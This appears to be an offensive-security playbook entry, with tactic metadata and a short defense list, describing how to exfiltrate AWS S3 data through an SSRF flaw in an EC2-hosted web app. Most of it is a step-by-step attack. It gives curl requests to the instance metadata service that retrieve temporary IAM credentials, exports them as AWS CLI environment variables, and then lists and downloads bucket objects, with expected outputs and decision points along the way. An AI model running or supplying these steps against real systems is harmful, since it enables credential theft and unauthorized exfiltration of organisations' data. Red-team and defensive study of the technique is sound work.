---
id: 6a3a44be-eea1-42c9-b949-db78e0392a67
name: Exfiltrate-AWS-S3-Data-via-EC2-SSRF
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:55:53.762350+00:00'
updated_at: '2023-04-06T03:55:53.777564+00:00'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Data from Cloud Storage]]'
sub_techniques: []
tags:
  - aws-s3
  - ssrf
  - exfiltration
  - cloud-metadata
commands:
  - '[[commands/curl-ec2-basic-metadata]]'
  - '[[commands/curl-ec2-iam-credentials]]'
  - '[[commands/aws-s3-list-bucket]]'
  - '[[commands/aws-s3-download-object]]'
platforms:
  - AWS
  - Linux
tools: []
validated: true
---

# Exfiltrate-AWS-S3-Data-via-EC2-SSRF

## Summary

This procedure outlines how to exfiltrate sensitive data from an AWS S3 bucket by exploiting a Server-Side Request Forgery (SSRF) vulnerability in a web application running on an EC2 instance. The attacker uses the SSRF to access the EC2 instance metadata service, retrieves temporary IAM credentials associated with the instance's role, and then uses those credentials to list and download objects from the target S3 bucket.

## Description

In AWS environments, EC2 instances with attached IAM roles can access the instance metadata service at http://169.254.169.254 to obtain temporary security credentials. If a web application on the EC2 instance has an SSRF vulnerability, an attacker can craft requests to fetch this metadata, including AccessKeyId, SecretAccessKey, and SessionToken. These credentials often grant permissions to S3 buckets containing sensitive data. Once obtained, the credentials can be used with tools like the AWS CLI to perform unauthorized S3 operations, such as listing bucket contents and downloading files. This technique targets cloud environments where SSRF is not properly mitigated, allowing internal service abuse for data exfiltration.

## Requirements

1. A confirmed SSRF vulnerability in a web application hosted on an EC2 instance with an IAM role that has read access to the target S3 bucket.
2. Knowledge of the target S3 bucket name (e.g., via prior reconnaissance or error messages).
3. Access to a terminal or script execution environment to process the exfiltrated credentials and run AWS CLI commands.
4. AWS CLI installed on the attacker's machine (version 2 recommended).
5. Network access to send SSRF payloads to the vulnerable application.

## Defense

- Enable IMDSv2 on EC2 instances to require session tokens for metadata access, preventing simple SSRF exploitation.
- Attach least-privilege IAM roles to EC2 instances, explicitly denying S3 access if not needed.
- Implement strict input validation and whitelisting in web applications to block requests to internal IPs like 169.254.169.254.
- Monitor S3 access logs and CloudTrail for anomalous API calls using assumed roles.
- Use VPC endpoints and network ACLs to restrict metadata service access.

## Objectives

1. Exploit SSRF to retrieve EC2 instance IAM credentials from the metadata service.
2. Use the retrieved credentials to authenticate to AWS services.
3. List and download sensitive objects from the target S3 bucket for exfiltration.

## Instructions

### Step 1: Exploit SSRF to Fetch Basic Instance Metadata

**Context**: Begin by using the SSRF vulnerability to request the root metadata endpoint. This reveals available metadata paths, including the IAM role name under 'iam/security-credentials/'. The SSRF payload should be crafted based on the vulnerability type (e.g., URL parameter in a GET request). Why: This step identifies the IAM role without assuming its name, reducing trial-and-error.

**Command** ([[commands/curl-ec2-basic-metadata]]):

To simulate or directly test (if shell access exists), use curl; adapt to your SSRF payload format.

```bash
curl "http://169.254.169.254/latest/meta-data/"
```

> Expected: A plain text list of metadata paths, e.g., 'ami-id', 'hostname', 'iam/security-credentials/'. If successful via SSRF, the response will be exfiltrated to your controlled endpoint. Decision point: If 'iam/security-credentials/' is present, proceed; otherwise, the instance may lack an IAM role.

### Step 2: Retrieve IAM Security Credentials

**Context**: Using the role name from Step 1 (e.g., 'PhotonInstance'), request the credentials endpoint via SSRF. This returns temporary AWS credentials valid for the role's permissions. Why: These creds enable S3 access without needing permanent keys. Replace $_ROLE_NAME with the actual role from Step 1 output.

**Command** ([[commands/curl-ec2-iam-credentials]]):

Adapt the URL into your SSRF payload to fetch the JSON response.

```bash
curl "http://169.254.169.254/latest/meta-data/iam/security-credentials/$_ROLE_NAME"
```

> Expected: JSON output like {"AccessKeyId":"ASIA...","SecretAccessKey":"...","Token":"...","Expiration":"..."}. Extract these values for use in subsequent steps. Success criteria: Valid JSON with non-empty credential fields; test by checking expiration time.

### Step 3: Configure AWS CLI with Retrieved Credentials

**Context**: Set the extracted credentials as environment variables for the AWS CLI. Why: This authenticates API calls to S3 without configuring profiles, allowing immediate use. If running in a script, automate extraction from the JSON response.

Instructions:
1. Parse the JSON from Step 2 to get AccessKeyId, SecretAccessKey, and Token.
2. Set environment variables:
   ```bash
export AWS_ACCESS_KEY_ID="$_ACCESS_KEY_ID"
export AWS_SECRET_ACCESS_KEY="$_SECRET_ACCESS_KEY"
export AWS_SESSION_TOKEN="$_SESSION_TOKEN"
   ```
   Decision point: If credentials expire soon (check Expiration field), prioritize quick exfiltration; otherwise, proceed to S3 operations.

> Expected: No output; verify with `aws sts get-caller-identity` (should return role ARN). If errors, check for typos in credential values.

### Step 4: List S3 Bucket Contents

**Context**: Use the configured credentials to enumerate objects in the target S3 bucket. Why: This identifies valuable data for targeted download, confirming access success. Replace $_BUCKET_NAME with the known bucket (e.g., 'company-sensitive-data').

**Command** ([[commands/aws-s3-list-bucket]]):

```bash
aws s3 ls s3://$_BUCKET_NAME/ --recursive
```

> Expected: List of objects with sizes and last-modified dates, e.g., '2023-01-01 12:00:00  1234 file.txt'. If empty, the role lacks list permissions or bucket doesn't exist. Success criteria: At least one object listed; pipe to file for review (`> bucket_contents.txt`).

### Step 5: Download Sensitive Objects from S3

**Context**: Download specific files identified in Step 4. Why: This achieves the exfiltration objective, transferring data to the attacker's control. Use --recursive for bulk download if needed; replace $_OBJECT_KEY with paths from Step 4 (e.g., 'confidential/user_data.csv').

**Command** ([[commands/aws-s3-download-object]]):

```bash
aws s3 cp s3://$_BUCKET_NAME/$_OBJECT_KEY ./exfiltrated/
```

> Expected: Progress output like 'download: s3://bucket/file.txt to ./exfiltrated/file.txt'. Files saved locally. Decision point: If download fails with AccessDenied, the role lacks getObject permission—abort or seek alternative paths. Success criteria: Files downloaded without errors; verify integrity with file sizes.
